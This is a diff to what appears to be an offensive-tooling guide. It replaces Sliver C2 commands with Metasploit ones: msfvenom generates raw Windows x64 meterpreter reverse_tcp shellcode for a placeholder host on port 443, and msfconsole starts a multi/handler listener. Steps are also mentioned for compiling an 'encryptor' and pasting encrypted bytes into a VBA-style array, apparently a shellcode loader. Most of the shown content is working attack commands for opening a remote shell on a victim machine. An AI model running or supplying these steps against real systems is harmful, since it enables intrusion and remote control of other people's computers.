@@ -11,7 +11,7 @@
 
 **1. Generate shellcode:**
 ```bash
-sliver > generate --mtls <IP>:443 --format shellcode --save /tmp/sc.bin
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 EXITFUNC=thread -f raw -o /tmp/sc.bin
 ```
 
 **2. Compile the encryptor:**
@@ -49,5 +49,5 @@ buf = Array(254, 132, 2, ...)  ' ← replace this line
 
 **6. Start your listener:**
 ```bash
-sliver > mtls --lhost <IP> --lport 443
+msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 443; set ExitOnSession false; exploit -j"
 ```
